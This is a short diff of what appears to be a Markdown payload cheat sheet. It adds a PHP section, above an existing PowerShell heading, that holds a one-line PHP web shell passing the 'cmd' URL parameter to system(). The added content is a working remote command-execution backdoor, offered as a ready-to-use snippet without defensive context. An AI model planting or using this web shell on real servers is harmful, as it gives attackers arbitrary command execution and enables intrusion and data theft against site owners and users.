@@ -1,3 +1,9 @@
+## PHP
+
+```PHP
+<?php echo(system($_GET["cmd"])); ?>
+```
+
 ## Powershell
 
 ```powershell
